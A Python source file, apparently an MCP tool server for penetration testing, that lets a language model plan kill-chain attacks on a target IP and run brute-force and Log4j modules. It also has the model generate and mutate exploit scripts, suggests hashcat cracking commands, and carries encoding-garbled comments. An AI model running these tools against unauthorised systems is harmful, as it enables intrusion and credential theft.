        """Identify hash type and suggest cracking commands. Provide an NTLM, NetNTLMv2, Kerberos TGS, MD5, SHA, or bcrypt hash. Returns hashcat mode and cracking command."""
        if not hash_value or not hash_value.strip():
            return "BLOCKED: hash_value is required."

        h = hash_value.strip()
        result_lines = ["HASH_CRACK_IDENTIFY:", ""]

        identifications = _identify_hash_modes(h)

        if identifications:
            for name, mode, cmd in identifications:
                result_lines.append(f"  Type: {name} (hashcat mode {mode})")
                result_lines.append(f"  Command: {cmd}")
                result_lines.append("")
        else:
            result_lines.append("  Unknown hash format. Try: hashid or hash-identifier tools.")
            result_lines.append(f"  Hash preview: {h[:80]}...")

        result_lines.append("")
        result_lines.append("Rule-based attack (more effective):")
        result_lines.append("  hashcat -m <mode> -a 0 hash.txt rockyou.txt -r best64.rule")
        result_lines.append("  hashcat -m <mode> -a 0 hash.txt rockyou.txt -r OneRuleToRuleThemAll.rule")

        return "\n".join(result_lines)

    # Ã¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢Â
    # Post-Exploitation & Lateral Movement
    # Ã¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢Â


    # Ã¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢Â
    # 2. Attack Planning & Strategy (tools.attack_planner)
    # Ã¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢Â

    @mcp.tool()
    @require_allowlist()
    def create_attack_plan(target_ip: str, target_os: str = "", known_cves: str = "") -> str:
        """Create a structured attack plan for a target IP.

        Uses the model router (if available) to generate intelligent attack phases and steps.
        The plan follows the standard kill chain: RECON Ã¢â€ â€™ ENUMERATE Ã¢â€ â€™ EXPLOIT Ã¢â€ â€™ ESCALATE Ã¢â€ â€™
        LOOT Ã¢â€ â€™ PIVOT Ã¢â€ â€™ DONE. The plan is saved as JSON for later retrieval and adaptation.

        Args:
            target_ip: IPv4 address of the target host.
            target_os: Optional OS hint (e.g., 'linux', 'windows').
            known_cves: Optional comma-separated CVE IDs known to affect the target.

        Returns:
            Plan summary: plan ID, phases, number of steps, and current phase.

        Example:
            create_attack_plan("192.168.1.100", "linux", "CVE-2024-6387,CVE-2021-44228")
        """
        if not validate_target_or_ip(target_ip):
            return "ERROR: Invalid target (IP or domain)."

        try:
            cve_list = [c.strip() for c in known_cves.split(",") if c.strip()] if known_cves else []
            plans_dir = workspace / "plans"
            plans_dir.mkdir(parents=True, exist_ok=True)

            planner = AttackPlanner(workspace)
            plan = planner.create_plan(
                target_ip=target_ip,
                target_os=target_os if target_os else None,
                known_cves=cve_list,
                attack_mode=True,
            )

            # Try to use the model router to generate intelligent steps
            client, model_name = _get_model_client(config)
            if client is not None:
                try:
                    prompt = build_planning_prompt(
                        phase=plan.current_phase,
                        target_ip=target_ip,
                        target_os=target_os if target_os else None,
                        known_cves=cve_list,
                        service_context=plan.service_context,
                        attacker_os=_platform_system(),
                    )
                    response = client.chat(
                        model_name,
                        messages=[{"role": "user", "content": prompt}],
                    )
                    content = response.get("message", {}).get("content", "") if isinstance(response, dict) else str(response)
                    steps = parse_plan_json(content)
                    for step in steps:
                        plan.add_step(step)
                except Exception:
                    pass  # Fall through to save plan without AI-generated steps

            planner.save_plan(plan)

            lines = [
                f"ATTACK_PLAN_CREATED: {target_ip}",
                f"PLAN_ID: {target_ip.replace('.', '_')}_plan.json",
                f"TARGET_OS: {target_os or 'Unknown'}",
                f"KNOWN_CVES: {', '.join(cve_list) if cve_list else 'None'}",
                f"PHASES: {' Ã¢â€ â€™ '.join(p.value for p in plan.phases)}",
                f"CURRENT_PHASE: {plan.current_phase.value}",
                f"TOTAL_STEPS: {len(plan.steps)}",
                f"SAVED_TO: {plans_dir / (target_ip.replace('.', '_') + '_plan.json')}",
            ]
            return "\n".join(lines)
        except Exception as exc:
            return f"ERROR: Plan creation failed Ã¢â‚¬â€ {exc}"

    @mcp.tool()
    @require_allowlist()
    def get_current_plan(target_ip: str) -> str:
        """Retrieve the current attack plan for a target IP.

        Loads the saved plan JSON from the workspace and returns a summary including
        current phase, completed/failed steps, and the battle log.

        Args:
            target_ip: IPv4 address of the target host.

        Returns:
            Plan summary or 'NO_PLAN_FOUND' if no plan exists for this target.

        Example:
            get_current_plan("192.168.1.100")
        """
        if not validate_target_or_ip(target_ip):
            return "ERROR: Invalid target (IP or domain)."

        try:
            planner = AttackPlanner(workspace)
            plan = planner.load_plan(target_ip)
            if plan is None:
                return f"NO_PLAN_FOUND: No attack plan exists for {target_ip}. Use create_attack_plan first."

            lines = [
                f"ATTACK_PLAN: {target_ip}",
                f"CURRENT_PHASE: {plan.current_phase.value}",
                f"PHASES: {' Ã¢â€ â€™ '.join(p.value for p in plan.phases)}",
                f"TOTAL_STEPS: {len(plan.steps)}",
                f"COMPLETED: {sum(1 for s in plan.steps if s.completed)}",
                f"SUCCESSFUL: {sum(1 for s in plan.steps if s.completed and s.success)}",
                f"FAILED: {sum(1 for s in plan.steps if s.completed and s.success is False)}",
                f"IS_COMPLETE: {plan.is_complete()}",
                "",
                plan.generate_battle_log(),
            ]
            return "\n".join(lines)
        except Exception as exc:
            return f"ERROR: Plan retrieval failed Ã¢â‚¬â€ {exc}"

    @mcp.tool()
    @require_allowlist()
    def replan(target_ip: str, failure_reason: str) -> str:
        """Adapt the current attack plan based on a failure or new information.

        Loads the existing plan, uses the replanning prompt to generate an updated
        strategy, and saves the adapted plan. This enables the AI to pivot when
        an attack vector fails.

        Args:
            target_ip: IPv4 address of the target host.
            failure_reason: Description of what failed and why (e.g., 'SSH brute force
                           blocked by rate limiting', 'target appears to be Windows not Linux').

        Returns:
            Updated plan summary with new phase/step information.

        Example:
            replan("192.168.1.100", "Log4j probe returned no response Ã¢â‚¬â€ service may be patched")
        """
        if not validate_target_or_ip(target_ip):
            return "ERROR: Invalid target (IP or domain)."

        try:
            planner = AttackPlanner(workspace)
            plan = planner.load_plan(target_ip)
            if plan is None:
                return f"NO_PLAN_FOUND: No attack plan exists for {target_ip}. Use create_attack_plan first."

            client, model_name = _get_model_client(config)
            if client is not None:
                try:
                    prompt = build_replanning_prompt(
                        plan=plan,
                        last_result=failure_reason,
                        attacker_os=_platform_system(),
                    )
                    response = client.chat(
                        model_name,
                        messages=[{"role": "user", "content": prompt}],
                    )
                    content = response.get("message", {}).get("content", "") if isinstance(response, dict) else str(response)
                    action, step, explanation = parse_replan_json(content)

                    if action == "next_phase":
                        plan.next_phase()
                    elif action == "done":
                        plan.current_phase_index = len(plan.phases) - 1
                    elif step is not None:
                        plan.add_step(step)
                except Exception:
                    # Fallback: just advance to next phase
                    plan.next_phase()

            planner.save_plan(plan)

            lines = [
                f"REPLAN_RESULT: {target_ip}",
                f"FAILURE_REASON: {failure_reason[:200]}",
                f"NEW_PHASE: {plan.current_phase.value}",
                f"TOTAL_STEPS: {len(plan.steps)}",
                "",
                plan.generate_battle_log(),
            ]
            return "\n".join(lines)
        except Exception as exc:
            return f"ERROR: Replan failed Ã¢â‚¬â€ {exc}"

    # Ã¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢Â
    # 3. Attack Modules & Pre-Packaged Exploits (tools.attack_modules)
    # Ã¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢Â

    @mcp.tool()
    @audit_tool
    def list_attack_modules() -> str:
        """List all registered pre-packaged attack modules.

        Returns a formatted list of every AttackModule with its name, description,
        target services, target ports, and required CVEs. Use this to discover
        available exploit recipes before running them with run_attack_module.

        Returns:
            Formatted list of all registered attack modules.

        Example:
            list_attack_modules()
        """
        try:
            modules = list_modules()
            if not modules:
                return "NO_MODULES: No attack modules registered."

            lines = [f"ATTACK_MODULES: {len(modules)} available", ""]
            for mod in modules:
                lines.append(f"  [{mod.name}]")
                lines.append(f"    Description: {mod.description}")
                lines.append(f"    Target Services: {', '.join(mod.target_services) if mod.target_services else 'any'}")
                lines.append(f"    Target Ports: {mod.target_ports if mod.target_ports else 'any'}")
                lines.append(f"    Required CVEs: {', '.join(mod.required_cves) if mod.required_cves else 'none'}")
                lines.append("")
            return "\n".join(lines)
        except Exception as exc:
            return f"ERROR: Module listing failed Ã¢â‚¬â€ {exc}"

    @mcp.tool()
    @require_allowlist()
    def run_attack_module(module_name: str, target_ip: str, options: str = "") -> str:
        """Execute a pre-packaged attack module against a target IP.

        Looks up the module by name, checks applicability against the target context
        (loading recon results if available), and executes the module. If the module
        generates a Python script, it is saved to the workspace.

        Args:
            module_name: Name of the attack module (e.g., 'SSHBruteForce', 'Log4jRCE').
                         Use list_attack_modules to see all available modules.
            target_ip: IPv4 address of the target host.
            options: Optional key=value pairs separated by spaces for module parameters.

        Returns:
            Structured result: applicability score, success/failure, output summary,
            and script path if a Python exploit was generated.

        Example:
            run_attack_module("SSHBruteForce", "192.168.1.100", "timeout=30 threads=4")
        """
        if not validate_target_or_ip(target_ip):
            return "ERROR: Invalid target (IP or domain)."

        try:
            module = get_module(module_name)
            if module is None:
                return f"ERROR: Module '{module_name}' not found. Use list_attack_modules to see available modules."

            # Build context Ã¢â‚¬â€ try to load recon results for richer context
            services: list[dict[str, str]] = []
            target_os: str | None = None
            cves: list[str] = []

            # Search for the most recent recon_result.json for this target
            for attempt_dir in sorted(workspace.glob("*"), key=lambda p: p.stat().st_mtime if p.exists() else 0, reverse=True):
                recon_file = attempt_dir / "recon_result.json"
                if recon_file.exists():
                    try:
                        recon_data = json.loads(recon_file.read_text(encoding="utf-8"))
                        if recon_data.get("target_ip") == target_ip:
                            target_os = recon_data.get("os_family")
                            for svc in recon_data.get("services", []):
                                services.append({
                                    "service": svc.get("service", ""),
                                    "port": f"{svc.get('port', '')}/{svc.get('protocol', 'tcp')}",
                                    "version": svc.get("version", ""),
                                })
                            # Extract CVEs from script results
                            for svc in recon_data.get("services", []):
                                for script_id, output in svc.get("scripts", {}).items():
                                    cve_matches = re.findall(r"CVE-\d{4}-\d{4,}", output)
                                    cves.extend(cve_matches)
                            break
                    except (json.JSONDecodeError, KeyError):
                        pass

            ctx = ModuleContext(
                target_ip=target_ip,
                target_os=target_os,
                services=services,
                cves=cves,
                workspace=workspace,
            )

            # Check applicability
            score = module.applicability(ctx)
            if score == 0:
                return (
                    f"MODULE_RESULT: not_applicable\n"
                    f"MODULE: {module_name}\n"
                    f"TARGET: {target_ip}\n"
                    f"APPLICABILITY_SCORE: 0\n"
                    f"REASON: Module does not match any known services or CVEs on this target."
                )

            # Execute module
            result = module.run(ctx)

            # Save generated script if present
            script_path = ""
            script_text = result.get("script", "")
            if script_text:
                modules_dir = workspace / "modules"
                modules_dir.mkdir(parents=True, exist_ok=True)
                safe_name = re.sub(r"[^A-Za-z0-9_.-]", "_", f"{module_name}_{target_ip}.py")
                script_path = str(modules_dir / safe_name)
                Path(script_path).write_text(script_text, encoding="utf-8")

            # Also try generate_python_script if run didn't produce one
            if not script_text:
                try:
                    script_text = module.generate_python_script(ctx)
                    if script_text:
                        modules_dir = workspace / "modules"
                        modules_dir.mkdir(parents=True, exist_ok=True)
                        safe_name = re.sub(r"[^A-Za-z0-9_.-]", "_", f"{module_name}_{target_ip}.py")
                        script_path = str(modules_dir / safe_name)
                        Path(script_path).write_text(script_text, encoding="utf-8")
                except Exception:
                    pass

            lines = [
                f"MODULE_RESULT: {result.get('status', 'executed')}",
                f"MODULE: {module_name}",
                f"TARGET: {target_ip}",
                f"APPLICABILITY_SCORE: {score}",
            ]
            if result.get("note"):
                lines.append(f"NOTE: {result['note']}")
            if result.get("suggested_command"):
                lines.append(f"SUGGESTED_COMMAND: {result['suggested_command']}")
            if result.get("suggested_msf"):
                lines.append(f"SUGGESTED_MSF: {result['suggested_msf']}")
            # Phase 2.1: render the compromise / credential signals a typed
            # ModuleResult (or an enriched dict from the autonomous executor)
            # carries. These keys are what ``AttackState.record_success`` reads
            # to flip ``access_achieved`` -- surfacing them here lets the MCP
            # caller see whether a module verified a real foothold.
            if result.get("shell_type"):
                lines.append(f"SHELL_TYPE: {result['shell_type']}")
            if result.get("privilege_level"):
                lines.append(f"PRIVILEGE_LEVEL: {result['privilege_level']}")
            creds = result.get("credentials_found") or result.get("credentials") or []
            if creds:
                creds_str = "; ".join(
                    c if isinstance(c, str) else " ".join(f"{k}={v}" for k, v in c.items())
                    for c in creds
                )
                lines.append(f"CREDENTIALS_FOUND: {creds_str}")
            if result.get("evidence"):
                lines.append(f"EVIDENCE: {'; '.join(str(e) for e in result['evidence'])}")
            if result.get("references"):
                lines.append(f"REFERENCES: {'; '.join(str(r) for r in result['references'])}")
            if script_path:
                lines.append(f"SCRIPT_SAVED: {script_path}")
            if result.get("script"):
                lines.append(f"SCRIPT_PREVIEW:\n{result['script'][:500]}")

            return "\n".join(lines)
        except Exception as exc:
            return f"ERROR: Module execution failed Ã¢â‚¬â€ {exc}"

    # Ã¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢Â
    # 4. Adaptive Exploit Generation (tools.payload_crafter + tools.exploit_mutator)
    # Ã¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢Â

    @mcp.tool()
    @require_allowlist()
    def craft_exploit(target_ip: str, service_name: str, version: str = "", os_hint: str = "", module_name: str = "") -> str:
        """Generate a custom exploit script tailored to a specific target service.

        Uses the ExploitMutator with experience-aware PayloadCrafter to produce a
        Python exploit script. The script is saved with metadata (generation_id,
        mutation strategy, confidence) for future mutation and lineage tracking.

        Args:
            target_ip: IPv4 address of the target host.
            service_name: Service to target (e.g., 'ssh', 'http', 'smb', 'rdp').
            version: Service version string (e.g., 'OpenSSH 8.9p1').
            os_hint: OS hint (e.g., 'linux', 'windows').
            module_name: Optional attack module name for context-aware generation.

        Returns:
            generation_id, file path, confidence score, mutation strategy,
            and first 500 characters of the generated script.

        Example:
            craft_exploit("192.168.1.100", "ssh", "OpenSSH 8.9p1", "linux", "RegreSSHion")
        """
        if not validate_target_or_ip(target_ip):
            return "ERROR: Invalid target (IP or domain)."
        if not service_name or not service_name.strip():
            return "ERROR: service_name is required."

        # Check config gate
        adaptive_cfg = (config or {}).get("adaptive_exploits", {})
        if not adaptive_cfg.get("enabled", True):
            return "BLOCKED: adaptive_exploits is disabled in config.yaml."

        try:
            exploits_dir = workspace / "exploits"
            exploits_dir.mkdir(parents=True, exist_ok=True)

            # Build experience store (lightweight JSONL fallback if DB unavailable)
            experience_store: ExperienceStore | None = None
            try:
                experience_store = ExperienceStore(get_default_db())
            except Exception:
                experience_store = None

            client, model_name = _get_model_client(config)
            max_mutations = int(adaptive_cfg.get("max_mutations", 5))

            mutator = ExploitMutator(
                workspace=exploits_dir,
                experience_store=experience_store,
                client=client,
                model=model_name,
                max_mutations=max_mutations,
            )

            payload: CraftedPayload = mutator.craft_initial(
                target_ip=target_ip,
                service_name=service_name,
                version=version,
                os_hint=os_hint,
                module_name=module_name,
            )

            # Save script
            script_path = exploits_dir / f"{payload.generation_id}.py"
            script_path.write_text(payload.script, encoding="utf-8")

            # Save sidecar metadata
            sidecar = {
                "generation_id": payload.generation_id,
                "parent_id": payload.parent_id,
                "mutation_strategy": payload.mutation_strategy,
                "confidence": payload.confidence,
                "metadata": payload.metadata,
                "created_at": datetime.now(timezone.utc).isoformat(),
            }
            sidecar_path = exploits_dir / f"{payload.generation_id}.json"
            sidecar_path.write_text(json.dumps(sidecar, indent=2, default=str), encoding="utf-8")

            lines = [
                "CRAFT_EXPLOIT_RESULT: generated",
                f"GENERATION_ID: {payload.generation_id}",
                f"SCRIPT_PATH: {script_path}",
                f"SIDECAR_PATH: {sidecar_path}",
                f"CONFIDENCE: {payload.confidence:.2f}",
                f"MUTATION_STRATEGY: {payload.mutation_strategy}",
                f"TARGET: {target_ip}",
                f"SERVICE: {service_name} {version}",
                f"OS_HINT: {os_hint}",
                f"MODULE: {module_name or 'none'}",
                "",
                "SCRIPT_PREVIEW (first 500 chars):",
                payload.script[:500],
            ]
            return "\n".join(lines)
        except Exception as exc:
            return f"ERROR: Exploit crafting failed Ã¢â‚¬â€ {exc}"

    @mcp.tool()
    @audit_tool
    def mutate_exploit(script_id: str, failure_output: str) -> str:
        """Mutate a previously generated exploit script based on failure feedback.

        Loads the script and its sidecar metadata by generation_id, then applies
        a mutation strategy (parameter_tweak, encoding_change, delivery_swap,
        context_aware) to produce an improved variant. The mutated script is saved
        with parent linkage for lineage tracking.

        Args:
            script_id: The generation_id of the previous exploit (e.g., 'gen-1712345678-abc12345').
            failure_output: The error output or failure reason from the previous execution.

        Returns:
            New generation_id, mutation strategy used, new file path, and first 500 chars
            of the mutated script.

        Example:
            mutate_exploit("gen-1712345678-abc12345", "ConnectionResetError: target closed connection")
        """
        if not script_id or not script_id.strip():
            return "ERROR: script_id is required."
        if not failure_output or not failure_output.strip():
            return "ERROR: failure_output is required."

        # Check config gate
        adaptive_cfg = (config or {}).get("adaptive_exploits", {})
        if not adaptive_cfg.get("enabled", True):
